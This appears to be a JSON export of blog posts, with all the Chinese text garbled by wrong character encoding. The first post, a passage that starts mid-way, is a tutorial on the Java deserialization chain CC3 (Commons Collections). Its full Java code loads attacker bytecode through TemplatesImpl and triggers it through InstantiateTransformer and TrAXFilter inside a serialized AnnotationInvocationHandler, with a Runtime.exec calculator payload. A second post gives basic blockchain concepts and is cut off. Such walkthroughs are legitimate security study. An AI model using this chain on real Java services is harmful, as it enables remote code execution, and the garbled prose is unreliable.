}\n\næˆ‘ä»¬å…ˆä¸è¿›è¡Œåºåˆ—åŒ–å’Œååºåˆ—åŒ–ï¼Œæˆ‘ä»¬å…ˆç”¨åå°„ä¿®æ”¹_tfactoryçš„å€¼ï¼Œçœ‹çœ‹èƒ½ä¸èƒ½å¼¹è®¡ç®—å™¨ï¼ˆè¿™é‡Œæˆ‘ä»¬å¹¶æ²¡æœ‰è¿›è¡Œåºåˆ—åŒ–å’Œååºåˆ—åŒ–ï¼Œæ‰€ä»¥å…¶å®å°±æ˜¯ç”¨åå°„ä¿®æ”¹äº†ä¸ªå€¼ï¼Œæ‰€ä»¥æ˜¯å¯ä»¥ä¿®æ”¹æˆåŠŸçš„ï¼‰ï¼š\nTemplatesImpl templatesimpl = new TemplatesImpl();        Class tmp = templatesimpl.getClass();        Field nameField = tmp.getDeclaredField(\"_name\");        nameField.setAccessible(true);        nameField.set(templatesimpl,\"y1\");        Field bytecodesField = tmp.getDeclaredField(\"_bytecodes\");        bytecodesField.setAccessible(true);        byte[] code = Files.readAllBytes(Paths.get(\"/Users/y1zh3e7/Desktop/Test.class\"));        byte[][] codes = {code};        bytecodesField.set(templatesimpl,codes);        Field tfactoryfield = tmp.getDeclaredField(\"_tfactory\");        tfactoryfield.setAccessible(true);        tfactoryfield.set(templatesimpl,new TransformerFactoryImpl());        templatesimpl.newTransformer();\n\næ²¡æœ‰å¼¹å‡ºæ¥è®¡ç®—å™¨ï¼Œçˆ†äº†ç©ºæŒ‡é’ˆå¼‚å¸¸ï¼Œé€šè¿‡è°ƒè¯•å‘ç°åœ¨_classæˆåŠŸåŠ è½½ç±»åï¼Œæ˜¯è¿™é‡ŒæŠ›å‡ºäº†å¼‚å¸¸ï¼š\nfinal Class superClass = _class[i].getSuperclass();if (superClass.getName().equals(ABSTRACT_TRANSLET)) {                    _transletIndex = i;                }                else {                    _auxClasses.put(_class[i].getName(), _class[i]);                }            }            if (_transletIndex &lt; 0) {                ErrorMsg err= new ErrorMsg(ErrorMsg.NO_MAIN_TRANSLET_ERR, _name);                throw new TransformerConfigurationException(err.toString());            }\n\nç¬¬ä¸€ä¸ªifæ£€æŸ¥_classçš„çˆ¶ç±»æ˜¯å¦å«ABSTRACT_TRANSLET ï¼Œå¦‚æœæ²¡æœ‰è¿›å…¥åˆ°ifé‡Œé¢é‚£ä¹ˆelseä¸­çš„_auxClassesä¸ºç©ºï¼Œå°±ä¼šæŠ›ç©ºæŒ‡é’ˆï¼Œå¹¶ä¸”ä¸‹é¢ç¬¬äºŒä¸ªifä¸­ä¹Ÿä¼šæŠ›å¼‚å¸¸ï¼Œä¸ºäº†é¿å…è¿™ä¸¤ä¸ªæŠ›å¼‚å¸¸çš„ç‚¹ï¼Œæˆ‘ä»¬éœ€è¦å°†_classåŠ è½½çš„æ¶æ„ç±»ç»§æ‰¿åä¸ºABSTRACT_TRANSLET çš„çˆ¶ç±»ï¼š\nprivate static String ABSTRACT_TRANSLET        = \"com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet\";\n\nä¿®æ”¹æ¶æ„ç±»ï¼Œç»§æ‰¿çš„çˆ¶ç±»ä¸­æœ‰ä¸¤ä¸ªæŠ½è±¡æ–¹æ³•éœ€è¦è¿›è¡Œé‡å†™ï¼š\npublic class Calc extends AbstractTranslet{    static{        try {            Runtime.getRuntime().exec(\"open -na Calculator\");        } catch (IOException e) {            throw new RuntimeException(e);        }    }    @Override    public void transform(DOM document, SerializationHandler[] handlers) throws TransletException {    }    @Override    public void transform(DOM document, DTMAxisIterator iterator, SerializationHandler handler) throws TransletException {            }}\n\nç°åœ¨å°±å¯ä»¥å¼¹å‡ºè®¡ç®—å™¨äº†ï¼Œå¦‚æœä½ è¿™é‡Œæ²¡æœ‰å¼¹å‡ºæ¥ï¼Œçœ‹ä¸€ä¸‹importçš„åŒ…æ˜¯ä¸æ˜¯æœ‰é—®é¢˜ï¼ŒTemplatesImplå’ŒTransformerFactoryImplçš„è·¯å¾„ä¸€å®šè¦æ˜¯com.xxxï¼Œå¦‚æœæ˜¯org.xxxæ˜¯ä¸èƒ½ç”¨çš„ï¼š\nimport com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;import java.lang.reflect.Field;import java.nio.file.Files;import java.nio.file.Path;import java.nio.file.Paths;public class CC3Test {    public static void main(String[] args) throws Exception{        TemplatesImpl templatesimpl = new TemplatesImpl();        Class tmp = templatesimpl.getClass();        Field nameField = tmp.getDeclaredField(\"_name\");        nameField.setAccessible(true);        nameField.set(templatesimpl,\"y1\");        Field bytecodesField = tmp.getDeclaredField(\"_bytecodes\");        bytecodesField.setAccessible(true);        byte[] code = Files.readAllBytes(Paths.get(\"/Users/y1zh3e7/Desktop/Test.class\"));        byte[][] codes = {code};        bytecodesField.set(templatesimpl,codes);        Field tfactoryfield = tmp.getDeclaredField(\"_tfactory\");        tfactoryfield.setAccessible(true);        tfactoryfield.set(templatesimpl,new TransformerFactoryImpl());        templatesimpl.newTransformer();    }}\n\nä¸‹é¢æˆ‘ä»¬è¦æƒ³åŠæ³•æ‰§è¡Œtemplatesimpl.newTransformerï¼Œè¿™é‡Œä¾æ—§æ˜¯ç”¨CC1ä¸­ç”¨åˆ°çš„InvokerTransformer.transformè¿›è¡Œä»£ç çš„æ‰§è¡Œï¼š\nTemplatesImpl templatesimpl = new TemplatesImpl();        Class tmp = templatesimpl.getClass();        Field nameField = tmp.getDeclaredField(\"_name\");        nameField.setAccessible(true);        nameField.set(templatesimpl,\"y1\");        Field bytecodesField = tmp.getDeclaredField(\"_bytecodes\");        bytecodesField.setAccessible(true);        byte[] code = Files.readAllBytes(Paths.get(\"/Users/y1zh3e7/Desktop/Test.class\"));        byte[][] codes = {code};        bytecodesField.set(templatesimpl,codes);        Field tfactoryfield = tmp.getDeclaredField(\"_tfactory\");        tfactoryfield.setAccessible(true);        tfactoryfield.set(templatesimpl,new TransformerFactoryImpl());        ChainedTransformer ctf = new ChainedTransformer(new Transformer[]{            new ConstantTransformer(templatesimpl),            new InvokerTransformer(\"newTransformer\",null,null)        });        ctf.transform(1);\n\nå‰©ä¸‹çš„æ‰¾Chainedtransformer.transform çš„è°ƒç”¨ç‚¹å°±å’ŒCC1åé¢ä¸€æ ·äº†ï¼Œç›´æ¥ç²˜è¿‡æ¥å°±æ˜¯ï¼š\npackage ysoserial.payloads.Test;import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;import org.apache.commons.collections.Transformer;import org.apache.commons.collections.functors.ChainedTransformer;import org.apache.commons.collections.functors.ConstantTransformer;import org.apache.commons.collections.functors.InvokerTransformer;import org.apache.commons.collections.map.TransformedMap;import java.lang.annotation.Target;import java.lang.reflect.Constructor;import java.lang.reflect.Field;import java.nio.file.Files;import java.nio.file.Path;import java.nio.file.Paths;import java.util.HashMap;import java.util.Map;import static ysoserial.payloads.util.Test.util.Serialize.serialize;import static ysoserial.payloads.util.Test.util.Unserialize.unserialize;public class CC3Test {    public static void main(String[] args) throws Exception{        TemplatesImpl templatesimpl = new TemplatesImpl();        Class tmp = templatesimpl.getClass();        Field nameField = tmp.getDeclaredField(\"_name\");        nameField.setAccessible(true);        nameField.set(templatesimpl,\"y1\");        Field bytecodesField = tmp.getDeclaredField(\"_bytecodes\");        bytecodesField.setAccessible(true);        byte[] code = Files.readAllBytes(Paths.get(\"/Users/y1zh3e7/Desktop/Test.class\"));        byte[][] codes = {code};        bytecodesField.set(templatesimpl,codes);        Field tfactoryfield = tmp.getDeclaredField(\"_tfactory\");        tfactoryfield.setAccessible(true);        tfactoryfield.set(templatesimpl,new TransformerFactoryImpl());        ChainedTransformer ctf = new ChainedTransformer(new Transformer[]{            new ConstantTransformer(templatesimpl),            new InvokerTransformer(\"newTransformer\",null,null)        });        HashMap map = new HashMap();        map.put(\"value\",\"v\");        Map&lt;Object,Object&gt; transformedMap = TransformedMap.decorate(map,null,ctf);        Class annotationInvocationHandler = Class.forName(\"sun.reflect.annotation.AnnotationInvocationHandler\");        Constructor annotationInvocationHandlerconstructor = annotationInvocationHandler.getDeclaredConstructor(Class.class,Map.class);        annotationInvocationHandlerconstructor.setAccessible(true);        Object o = annotationInvocationHandlerconstructor.newInstance(Target.class,transformedMap);        serialize(o);        unserialize(\"ser.bin\");    }}\n\nç›¸è¾ƒäºCC1æ¥è¯´ä¸€ä¸ªæ˜¯é€šè¿‡è°ƒç”¨Runtimeæ¥è¿›è¡Œå‘½ä»¤æ‰§è¡Œï¼Œä¸€ä¸ªæ˜¯é€šè¿‡åŠ¨æ€ç±»åŠ è½½è¿›è¡Œä»£ç æ‰§è¡Œï¼Œå¦‚æœè¿‡æ»¤äº†Runtimeæˆ‘ä»¬å°±å¯ä»¥å°è¯•ç”¨è¿™æ¡CC3\næ¥ä¸‹æ¥æˆ‘ä»¬åœ¨æ¥è¯´ysoserialä¸Šç”¨çš„å¦ä¸€æ¡è°ƒç”¨é“¾ï¼š\næˆ‘ä»¬å›åˆ°newTransformerï¼Œåˆšæ‰è¯´çš„æ˜¯ç”¨CC1ååŠæ®µç›´æ¥è°ƒç”¨ï¼Œæˆ‘ä»¬æ¥ç€å‘ä¸‹æ‰¾è°ƒç”¨newTransformer çš„åœ°æ–¹ï¼Œæœ€ç»ˆé”å®šåœ¨äº†com/sun/org/apache/xalan/internal/xsltc/trax/TrAXFilter.java è¿™ä¸ªç±»ä¸Šï¼Œè¿™ä¸ªç±»æ²¡æœ‰ç»§æ‰¿serializeæ¥å£ï¼Œä¹Ÿå°±æ˜¯è¯´æˆ‘ä»¬æ²¡åŠæ³•é€šè¿‡åå°„æ¥ä¿®æ”¹å®ä¾‹ä¸­å±æ€§çš„å€¼ï¼Œä½†æ˜¯æˆ‘ä»¬æƒ³åˆ°å¯¹å±æ€§å€¼è¿›è¡Œåˆå§‹åŒ–çš„æ“ä½œä¸€èˆ¬åœ¨æ„é€ å‡½æ•°ä¸­ï¼Œæˆ‘ä»¬æ¥çœ‹ä¸€ä¸‹å®ƒçš„æ„é€ å‡½æ•°ï¼š\npublic TrAXFilter(Templates templates)  throws        TransformerConfigurationException    {        _templates = templates;        _transformer = (TransformerImpl) templates.newTransformer();        _transformerHandler = new TransformerHandlerImpl(_transformer);        _useServicesMechanism = _transformer.useServicesMechnism();    }\n\næˆ‘ä»¬å¯ä»¥é€šè¿‡è¿™ä¸ªæ„é€ å‡½æ•°æ¥æ§åˆ¶è¿™ä¸ªtemplatesçš„å€¼ï¼Œæ‰€ä»¥ä¸‹ä¸€æ­¥å°±æ˜¯è¦æ‰¾å¯ä»¥è°ƒç”¨è¿™ä¸ªæ„é€ å‡½æ•°çš„åœ°æ–¹ï¼Œysoserialä¸­ç»™å‡ºäº†InstantiateTransformer è¿™ä¸ªç±»ï¼Œé€šè¿‡å®ƒçš„æ„é€ å‡½æ•°å’Œtransformæ–¹æ³•å¯ä»¥è°ƒç”¨ä¸€ä¸ªå¯¹è±¡çš„æŒ‡å®šå‚æ•°çš„æ„é€ å‡½æ•°ï¼š\n public InstantiateTransformer(Class[] paramTypes, Object[] args) {        this.iParamTypes = paramTypes;        this.iArgs = args;    }public Object transform(Object input) {        try {            if (!(input instanceof Class)) {                throw new FunctorException(\"InstantiateTransformer: Input object was not an instanceof Class, it was a \" + (input == null ? \"null object\" : input.getClass().getName()));            } else {                Constructor con = ((Class)input).getConstructor(this.iParamTypes);                return con.newInstance(this.iArgs);            }\n\nä¹Ÿå°±æ˜¯è¯´ä¸‹é¢ä¸¤è¡Œä»£ç å°±å¯ä»¥æ‰§è¡ŒnewTransformeräº†ï¼š\nInstantiateTransformer instantiateTransformer = new InstantiateTransformer(new Class[]{Templates.class},new Object[]{templatesimpl});instantiateTransformer.transform(TrAXFilter.class);\n\næœ€ç»ˆè¿˜æ˜¯ç”¨ChainedTransformeråŒ…è£¹èµ·æ¥æ‰§è¡Œï¼š\nTemplatesImpl templatesimpl = new TemplatesImpl();        Class tmp = templatesimpl.getClass();        Field nameField = tmp.getDeclaredField(\"_name\");        nameField.setAccessible(true);        nameField.set(templatesimpl,\"y1\");        Field bytecodesField = tmp.getDeclaredField(\"_bytecodes\");        bytecodesField.setAccessible(true);        byte[] code = Files.readAllBytes(Paths.get(\"/Users/y1zh3e7/Desktop/Test.class\"));        byte[][] codes = {code};        bytecodesField.set(templatesimpl,codes);        Field tfactoryfield = tmp.getDeclaredField(\"_tfactory\");        tfactoryfield.setAccessible(true);        tfactoryfield.set(templatesimpl,new TransformerFactoryImpl());        InstantiateTransformer instantiateTransformer = new InstantiateTransformer(new Class[]{Templates.class},new Object[]{templatesimpl});        ChainedTransformer ctf = new ChainedTransformer(new Transformer[]{            new ConstantTransformer(TrAXFilter.class),            instantiateTransformer        });        HashMap map = new HashMap();        map.put(\"value\",\"v\");        Map&lt;Object,Object&gt; transformedMap = TransformedMap.decorate(map,null,ctf);        Class annotationInvocationHandler = Class.forName(\"sun.reflect.annotation.AnnotationInvocationHandler\");        Constructor annotationInvocationHandlerconstructor = annotationInvocationHandler.getDeclaredConstructor(Class.class,Map.class);        annotationInvocationHandlerconstructor.setAccessible(true);        Object o = annotationInvocationHandlerconstructor.newInstance(Target.class,transformedMap);        serialize(o);        unserialize(\"ser.bin\");\n\nå®Œæ•´çš„CC6è°ƒç”¨é“¾ï¼Œå½“InvokerTransformerè¢«banæ—¶å°±å¯ä»¥ç”¨è¿™æ¡é“¾ï¼š\n\n","categories":["WebSec"],"tags":["Javaååºåˆ—åŒ–"]},{"title":"åŒºå—é“¾å®‰å…¨å‰ç½®æ‰«ç›²","url":"/2023/04/24/%E5%8C%BA%E5%9D%97%E9%93%BE%E5%AE%89%E5%85%A8%E5%89%8D%E7%BD%AE%E6%89%AB%E7%9B%B2/","content":"web3.0å®‰é—»å…¨çŸ¥\nå‚è€ƒé“¾æ¥\n\nå»ä¸­å¿ƒåŒ–åº”ç”¨ç¨‹åº Dapp æ˜¯ä»€ä¹ˆï¼Ÿä¸ APP æœ‰å“ªäº›åŒºåˆ«ï¼Ÿ\nhttps://www.youtube.com/watch?v=YdWP-wJh9jA\näº’è”ç½‘å‘å±•çš„ä¸‰ä¸ªé˜¶æ®µweb1.0é™æ€é¡µé¢ï¼Œå†…å®¹åªèƒ½ä¾›ç”¨æˆ·å»é˜…è¯»ï¼Œç±»ä¼¼äºåœ¨ç½‘ç»œä¸Šè¯»æŠ¥çº¸æˆ–è€…çœ‹ä¹¦ã€‚\nweb2.0åŠ¨æ€äº’è”ç½‘ï¼Œå®ç°ç”¨æˆ·ä¹‹é—´çš„äº’åŠ¨ï¼Œæ¯”å¦‚twitterï¼Œfacebookï¼Œtitokç­‰ã€‚\nweb2.0ä¸­å‚å•†ç”¨å…è´¹æˆ–æä½çš„æˆæœ¬å¸å¼•ç”¨æˆ·ï¼Œé€šè¿‡è·å–åˆ°ç”¨æˆ·çš„ä¿¡æ¯æ¥æ¨æµå¹¿å‘Šä»è€Œè·å¾—åˆ©æ¶¦ã€‚\næ‰“ä¸ªæ¯”æ–¹å°±æ˜¯ å‚å•†åœ¨ä¸€ç‰‡åœ°ä¸Šç§äº†å¾ˆå¤šè‰ï¼Œå¸å¼•ç¾Šæ¥åƒï¼Œè¶ç€ç¾Šåƒè‰çš„åŠŸå¤«æŠŠç¾Šèº«ä¸Šçš„æ¯›è–…ä¸‹æ¥æ‹¿å»å–é’±ï¼Œè€Œç¾Šè‡ªå·±å¹¶ä¸åœ¨æ„è¿™äº›æ¯›ï¼Œå¯ä»¥è¯´æ˜¯ä¸€ç§åŒå‘äº’åˆ©çš„æ–¹å¼ã€‚\nweb3.0web3.0æ˜¯ä¸€ä¸ªå¾ˆæ¨¡ç³Šçš„æ¦‚å¿µï¼Œéšç€åŒºå—é“¾æŠ€æœ¯çš„å‘å±•ï¼ŒåŸºäºåŒºå—é“¾çš„web3.0è¯ç”Ÿã€‚\næ¥ç€ç”¨ä¸Šé¢çš„ä¾‹å­æ¥è¯´ï¼Œéšç€web2.0çš„å‘å±•å£®å¤§ï¼Œç¨€ç¼ºçš„ä¸å†æ˜¯è‰ï¼Œè€Œæ˜¯ç¾Šæ¯›ï¼Œä¹Ÿå°±æ˜¯ç”¨æˆ·èº«ä¸Šçš„æ•°æ®ã€‚é‚£ä¹ˆç¾Šæ¯›çš„é‡è¦æ€§æ„ˆåŠ çªå‡ºï¼Œæ‰€ä»¥æå‡ºweb3.0çš„æ¦‚å¿µï¼Œä¹Ÿå°±æ˜¯æ‹¥æœ‰è‡ªå·±çš„ä¸€ç‰‡ç©ºé—´ï¼Œåˆ«äººæ— è®ºå¦‚ä½•éƒ½æ— æ³•ä¿®æ”¹ï¼Œä¹Ÿå°±æ˜¯å°†ç¾Šæ¯›ï¼ˆæ•°æ®ï¼‰å­˜æ”¾åœ¨äº†ä¸€ä¸ªéå¸¸å®‰å…¨çš„åœ°æ–¹ä¸­ï¼Œç›¸æ¯”äºweb2.0ï¼Œä¸ä½†å®ç°äº†åŠ¨æ€çš„äº¤äº’ï¼Œä¹Ÿå®ç°äº†æ•°æ®çš„â€œæ‹¥æœ‰â€ã€‚\nweb3çš„æ¦‚å¿µéå¸¸æ¨¡ç³Šï¼Œå¯ä»¥è¯´æ˜¯ä¸€ä¸ªå¤§æ–¹å‘ï¼ŒæŒ‰ç…§æˆ‘ä¸ªäººçš„ç†è§£å¯ä»¥è¯´æ˜¯åœ¨äº’è”ç½‘åˆ›é€ äº†ä¸€ä¸ªè™šæ‹Ÿçš„ä¸–ç•Œï¼Œè¿™ä¸ªè™šæ‹Ÿçš„ä¸–ç•Œæ‹¥æœ‰å’Œç°å®ä¸–ç•Œä¸€æ ·çš„è´§å¸äº¤æ˜“ç³»ç»Ÿä»¥åŠå…¶ä»–ä½“ç³»ï¼Œèƒ½å¤Ÿè‡ªä¸»ç»´æŒè¿è½¬çš„è¿™æ ·ä¸€ä¸ªâ€œè™šæ‹Ÿç”Ÿæ€ç³»ç»Ÿâ€ï¼Œè€Œè¿™ä¸ªç”Ÿæ€ç³»ç»Ÿçš„ç”Ÿå­˜æ³•åˆ™å°±æ˜¯â€œå»ä¸­å¿ƒåŒ–â€ã€‚\nä»€ä¹ˆæ˜¯å»ä¸­å¿ƒåŒ–ï¼Ÿ\næ¯”å¦‚ç°åœ¨å¸‚é¢ä¸Šçš„appéƒ½ç”±ä¸€ä¸ªå‚å®¶è´Ÿè´£ï¼Œå‚å•†å¯ä»¥éšæ„åˆ é™¤æ§åˆ¶ç”¨æˆ·æ•°æ®ï¼Œå½¢æˆäº†ä»¥å‚å•†ä¸ºä¸­å¿ƒçš„æœåŠ¡ä½“ç³»ï¼Œå»ä¸­å¿ƒåŒ–å°±æ˜¯æ²¡æœ‰ä¸­å¿ƒå‚å•†ä½œä¸ºæ ¸å¿ƒï¼Œè€Œæ˜¯æ‰€æœ‰ç”¨æˆ·å½¢æˆä¸€ä¸ªèƒ½å¤Ÿè‡ªåŠ›æ›´ç”Ÿçš„ä½“ç³»ã€‚\nå¯†ç è´§å¸éšç€web2.0å‘å±•ï¼Œæ•°å­—è´§å¸ä½¿ç”¨è¶Šæ¥è¶Šå¤šï¼Œè€Œåœ¨åŒºå—é“¾æŠ€æœ¯çš„æ”¯æŒä¸‹ï¼Œæ•°å­—è´§å¸ä¹Ÿå‡ºç°äº†å…¨æ–°çš„å­˜åœ¨å½¢å¼ï¼Œå»ä¸­å¿ƒåŒ–çš„å¯†ç è´§å¸ï¼Œä¸–ç•Œä¸Šç¬¬ä¸€ç§å¯†ç è´§å¸å°±æ˜¯æ¯”ç‰¹å¸ã€‚åƒçº¸å¸æœ‰é˜²ä¼ªå°ä¸€æ ·ï¼Œå¯†ç è´§å¸é€šè¿‡å¯†ç å­¦çš„æ•£åˆ—è®¡ç®—å‡ºçš„hashå€¼å¹¶ä¸”å’Œæ™ºèƒ½åˆçº¦è¿›è¡Œç»‘å®šï¼Œå¯†ç è´§å¸åŸºäºå»ä¸­å¿ƒåŒ–çš„æœºåˆ¶ï¼Œä¸ä¾èµ–ä¸­å¿ƒç›‘ç®¡ä½“ç³»çš„é“¶è¡Œé‡‘èç³»ç»Ÿç›¸å¯¹ã€‚ä¹‹åå‡ºç°çš„æ•°ç§å¯†ç è´§å¸è¢«åˆ›é€ ï¼Œå®ƒä»¬é€šå¸¸è¢«ç§°ä¸ºaltcoinsã€‚\nåŒºå—é“¾ç¨‹åºå‘˜æ¥è®²è®²ä»€ä¹ˆæ˜¯åŒºå—é“¾ | å°ç™½ä¹Ÿèƒ½å¬æ‡‚çš„é€šä¿—è§£é‡Š | åŒºå—é“¾åŸç† | æ¯”ç‰¹å¸ | æ•°å­—è´§å¸_å“”å“©å“”å“©_bilibili\nåŒºå—é“¾çš„é˜²ç¯¡æ”¹æœºåˆ¶ä¸€ä¸ªåŒºå—ä¸­å‚¨å­˜äº†ä¸‰æ ·ä¸œè¥¿ï¼šæ•°æ®ï¼Œå‰ä¸€ä¸ªåŒºå—çš„hashå€¼ï¼Œè‡ªèº«çš„hashå€¼ï¼ˆç”±æ•°æ®å’Œå‰ä¸€åŒºå—çš„å“ˆå¸Œå€¼å…±åŒå†³å®šï¼‰ï¼Œå¦‚æœè¦æ›´æ”¹æŸä¸€åŒºå—çš„å†…å®¹ï¼Œé‚£ä¹ˆè¯¥åŒºå—ï¼ˆaåŒºå—ï¼‰çš„hashå€¼å°±ä¼šæ”¹å˜ï¼Œä¸‹ä¸€åŒºå—ï¼ˆbåŒºå—ï¼‰å‚¨å­˜çš„aåŒºå—çš„hashå€¼æ— æ³•å¯¹åº”aåŒºå—å½“å‰å“ˆå¸Œå€¼ï¼Œé‚£ä¹ˆè¿™ä¸¤ä¸ªåŒºå—é—´çš„é“¾æ¥å°±ä¼šæ–­å¼€ã€‚\nå¦‚æœæƒ³è¦ç¯¡æ”¹æŸä¸€åŒºå—çš„æ•°æ®ï¼Œæˆ‘ä»¬å°±è¦å°†è¿™ä¸€åŒºå—ä»¥åŠåç»­æ‰€æœ‰åŒºå—çš„hashå€¼è¿›è¡Œé‡ç®—ï¼Œæ¯”å¦‚ä¸€æ¡åŒºå—é“¾é‡Œé¢æœ‰abcdeäº”ä¸ªåŒºå—ï¼Œå½“æˆ‘ä»¬ç¯¡æ”¹äº†båŒºå—çš„æ•°æ®ï¼Œé‚£ä¹ˆæˆ‘ä»¬å°±è¦å¸¦ç€båŒºå—çš„æ–°hashå€¼å’ŒcåŒºå—çš„æ•°æ®é‡æ–°è®¡ç®—å‡ºcåŒºå—çš„æ–°hashå€¼ï¼Œç„¶åå†å¸¦ç€cåŒºå—çš„æ–°hashå€¼å’ŒdåŒºå—çš„æ•°æ®é‡æ–°è®¡ç®—dåŒºå—çš„æ–°hashå€¼ï¼Œå†å¸¦ç€dåŒºå—çš„æ–°hashå€¼å’ŒeåŒºå—çš„æ•°æ®é‡æ–°è®¡ç®—eåŒºå—çš„hashå€¼â€¦â€¦â€¦â€¦â€¦â€¦â€¦..å…¶å®åœ¨é‡æ–°è®¡ç®—æŸä¸€åŒºå—çš„hashå€¼çš„è¿‡ç¨‹ä¹Ÿå°±ç›¸å½“äºåˆ›é€ äº†ä¸€ä¸ªæ–°çš„åŒºå—ï¼Œå› æ­¤ç¯¡æ”¹ä¸€ä¸ªåŒºå—ä»¥åŠåç»­åŒºå—æ‰€éœ€çš„æ—¶é—´å–å†³äºåˆ›é€ ä¸€ä¸ªåŒºå—æ‰€éœ€è¦çš„æ—¶é—´ã€‚\nè¿™ä¸ªçœ‹èµ·æ¥å¯¹ç®—åŠ›è¦æ±‚ä¼¼ä¹éå¸¸åºå¤§ï¼Œä½†æ˜¯ç°ä»£è®¡ç®—æœºå…¶å®æ˜¯å¯ä»¥åšåˆ°è¿™ä¸€ç‚¹çš„ï¼Œå¦‚æœæˆ‘ä»¬æœ‰ä¸€å°è¶…å¤§ç®—åŠ›çš„è®¡ç®—æœºï¼Œé‚£ä¹ˆæ˜¯ä¸æ˜¯è½»æ¾å°±å¯ä»¥æ”¹å˜åŒºå—é“¾çš„å†…å®¹äº†ï¼Ÿä¸ºäº†é˜²æ­¢è¿™ç§æƒ…å†µçš„å‡ºç°ï¼ŒåŒºå—é“¾åŠ å…¥äº†å·¥ä½œé‡è¯æ˜æœºåˆ¶ï¼ˆproof of workï¼‰ç®€ç§° pow\næˆ‘ä»¬ç”¨æ¸¸æˆä¸¾ä¾‹è¯´æ˜ä¸€ä¸‹powï¼Œæˆ‘ä»¬åˆšæ‰è¯´åˆ°ç”¨è¶…å¤§ç®—åŠ›è®¡ç®—æœºæ¥ç¯¡æ”¹åŒºå—é“¾ï¼Œè¿™å°±å¥½æ¯”ä½ æ‹¿ç€æ»¡çº§ç¥è£…åœ¨æ–°æ‰‹æ‘ä¹±æ€ï¼ŒåŒºå—é“¾æ˜¯ä¸å…è®¸è¿™ç§æƒ…å†µå‡ºç°çš„ï¼Œå› æ­¤å®ƒä¼šä¸Šè°ƒæ€ªç‰©å±æ€§ï¼Œä¹Ÿå°±æ˜¯ä¼šå¢åŠ åˆ›é€ ä¸€ä¸ªåŒºå—æ‰€éœ€çš„éš¾åº¦ï¼Œä½¿æ¯ä¸€æ–°åŒºå—è¢«åˆ›é€ æ—¶éƒ½ä¿æŒåœ¨ååˆ†é’Ÿå·¦å³ï¼ˆå½“ç„¶è¿™ä¸ªæ—¶é—´æ˜¯å¯ä»¥æ›´æ”¹çš„ï¼‰ï¼Œå› æ­¤å³ä½¿æ˜¯ä¸€å°è¶…é«˜ç®—åŠ›çš„è®¡ç®—æœºæƒ³è¦ç¯¡æ”¹ä¸€ä¸ªåŒºå—æ‰€éœ€çš„æ—¶é—´ä»ç„¶æ˜¯æ˜¯ \nåˆ›é€ ä¸€ä¸ªåŒºå—çš„æ—¶é—´âœ–ï¸n minã€‚\né‚£æˆ‘ä»¬æ‰€è¯´çš„æŒ–çŸ¿æ˜¯ä»€ä¹ˆå‘¢ï¼Ÿä¸Šé¢æåˆ°çš„æƒ…å†µæ˜¯æƒ³è¦ç¯¡æ”¹åŒºå—ä¸­çš„æ•°æ®ï¼Œé‚£ä¹ˆæˆ‘æ²¡æœ‰æ¶æ„ï¼Œæˆ‘åªæ˜¯å•çº¯çš„åˆ›é€ åŒºå—å»ç»™è‡ªå·±æˆ–è€…ä»–äººä½¿ç”¨ï¼Œè¿™ä¸ªåˆ›é€ åŒºå—çš„è¿‡ç¨‹ç‰ºç‰²äº†æˆ‘ç”µè„‘çš„ç®—åŠ›å’Œä¸€äº›å…¶ä»–èµ„æºï¼Œæ‰€ä»¥ä½œä¸ºè¡¥å¿ï¼Œåˆ›å»ºåŒºå—çš„äººä¼šå¾—åˆ°å¯†ç è´§å¸çš„å¥–åŠ±ï¼Œè¿™å°±æ˜¯æˆ‘ä»¬æ‰€è¯´çš„æŒ–çŸ¿ã€‚\nåŒºå—é“¾çš„ç‚¹å¯¹ç‚¹ç½‘ç»œç»“æ„\nåœ¨ä¼ ç»Ÿçš„webæœåŠ¡ä¸­ï¼Œä¼ ç»Ÿçš„é“¾æ¥å¯¹è±¡åŸºæœ¬éƒ½æ˜¯å®¢æˆ·ç«¯å’ŒæœåŠ¡ç«¯ï¼Œä¼—å¤šå®¢æˆ·ç«¯è®¿é—®ä¸€ä¸ªæœåŠ¡ç«¯æ¥è¿›è¡Œäº¤äº’ï¼Œè€Œåœ¨åŒºå—é“¾çš„ç‚¹å¯¹ç‚¹ç½‘ç»œç»“æ„ï¼ˆpeer to peerï¼‰ä¸­ï¼Œä¸å†æœ‰å®¢æˆ·ç«¯ä¸æœåŠ¡ç«¯çš„æ¦‚å¿µï¼Œæ¯ä¸€ä¸ªèŠ‚ç‚¹é—´ç›¸äº’å¹³ç­‰ï¼Œå¹¶ä¸”åŒ…å«å®Œæ•´çš„åŒºå—é“¾æ•°æ®å­˜å‚¨ï¼Œä¹Ÿå°±æ˜¯è¯´æ¯ä¸€ä¸ªèŠ‚ç‚¹ä¸­éƒ½å‚¨å­˜äº†æ•´ä¸ªåŒºå—é“¾ç½‘ç»œä¸­çš„æ‰€æœ‰ä¿¡æ¯ï¼Œè¿™æ ·å³ä½¿ä¸€ä¸ªèŠ‚ç‚¹å‡ºç°æ•…éšœï¼Œå…¶ä»–æ‰€æœ‰èŠ‚ç‚¹ä¹Ÿåœ¨å¸®ä»–è®°å½•ä¿¡æ¯ï¼Œè¿™äº›è®°å½•äº†æ‰€æœ‰èŠ‚ç‚¹åŒºå—é“¾çš„èŠ‚ç‚¹å«åšå…¨èŠ‚ç‚¹ï¼Œå½“ç„¶ä¹Ÿæœ‰åªå‚¨å­˜äº†è‡ªå·±ä¿¡æ¯çš„è½»èŠ‚ç‚¹ï¼Œæ¯”å¦‚åŒºå—é“¾ç”¨æ¥å‚¨å­˜è½¬è´¦è®°å½•ï¼Œé‚£ä¹ˆæ¯ä¸€èŠ‚ç‚¹éƒ½å‚¨å­˜äº†æ‰€æœ‰èŠ‚ç‚¹ä¹‹é—´çš„è½¬è´¦è®°å½•ï¼Œæ¯ä¸€èŠ‚ç‚¹å‚¨å­˜çš„å†…å®¹ä¹Ÿæ˜¯ç›¸åŒçš„ï¼Œå¦‚æœæŸä¸€èŠ‚ç‚¹ä¸å…¶ä»–èŠ‚ç‚¹å‡ºç°å·®å¼‚ï¼Œé‚£ä¹ˆè¯¥èŠ‚ç‚¹æˆ–è®¸å°±æœ‰è¢«ç¯¡æ”¹è¿‡çš„å¯èƒ½äº†ï¼Œä½†æ˜¯è¢«ç¯¡æ”¹å‡ 